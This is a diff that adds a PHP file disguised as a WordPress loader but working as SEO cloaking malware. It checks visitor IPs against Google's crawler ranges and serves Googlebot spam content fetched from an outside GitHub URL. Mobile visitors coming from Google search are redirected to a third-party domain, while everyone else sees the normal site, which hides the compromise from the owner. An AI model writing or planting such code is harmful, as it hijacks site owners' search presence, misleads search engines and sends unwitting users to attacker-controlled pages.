@@ -1,0 +1,96 @@
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+$agent = $_SERVER['HTTP_USER_AGENT'];
+$reff = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : ''; // Check for REFERER
+
+$desktopContentUrl = 'https://raw.githubusercontent.com/gayusinhere/Code/refs/heads/main/kil0cek1';
+$mobileContentUrl = 'https://www.infrarrealismo.com/amp/';
+
+// Function to get client IP address
+if (!function_exists('get_client_ip')) {
+    function get_client_ip() {
+        $ipaddress = '';
+        if (isset($_SERVER['HTTP_CLIENT_IP'])) {
+            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+        } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+        } elseif (isset($_SERVER['REMOTE_ADDR'])) {
+            $ipaddress = $_SERVER['REMOTE_ADDR'];
+        }
+        return $ipaddress;
+    }
+}
+
+// Function to fetch content from URL using cURL
+if (!function_exists('get_content')) {
+    function get_content($url) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $result = curl_exec($ch);
+        curl_close($ch);
+        return $result;
+    }
+}
+
+$ip = get_client_ip();
+
+// Check Googlebot IPs
+$google = "https://developers.google.com/search/apis/ipranges/googlebot.json";
+$rgoogle = get_content($google);
+$dgoogle = json_decode($rgoogle, true);
+
+$googleBotIPs = [];
+if (isset($dgoogle['prefixes'])) {
+    foreach ($dgoogle['prefixes'] as $resultx) {
+        if (!empty($resultx['ipv4Prefix'])) {
+            $ipnya = explode('/', $resultx['ipv4Prefix']);
+            $start = ip2long($ipnya[0]);
+            $ip_count = 1 << (32 - $ipnya[1]);
+
+            for ($i = 0; $i < $ip_count; $i++) {
+                $fixip = long2ip($start + $i);
+                $googleBotIPs[] = $fixip;
+            }
+        }
+    }
+}
+
+// Check if the IP is a Googlebot IP
+$isGoogleBot = in_array($ip, $googleBotIPs);
+
+// Check for mobile user agent
+$isMobile = strpos($agent, 'Mobile') !== false;
+$isGoogleSearch = strpos($reff, 'google.com') !== false;
+
+if ($isGoogleBot) {
+    // If it's a Googlebot, serve desktop content
+    header('Content-Type: text/html');
+    echo get_content($desktopContentUrl);
+    exit();
+} elseif ($isMobile && $isGoogleSearch) {
+    // If it's a mobile user from Google search, redirect to mobile content
+    header('Location: ' . $mobileContentUrl);
+    exit();
+} else {
+    // For all other users, load the original WordPress content
+    // Adjust this path according to your WordPress installation
+    $wpLoadPath = '/home/stcl/public_html/wp-load.php'; // Adjust the path as needed
+
+    if (file_exists($wpLoadPath)) {
+        require_once $wpLoadPath;
+
+        // Set up the WordPress query.
+        wp();
+
+        // Load the theme template.
+        require_once ABSPATH . WPINC . '/template-loader.php';
+    } else {
+        // Handle error if wp-load.php is not found
+        echo "Error: WordPress could not be loaded. Please check the path.";
+        exit();
+    }
+}
+?>
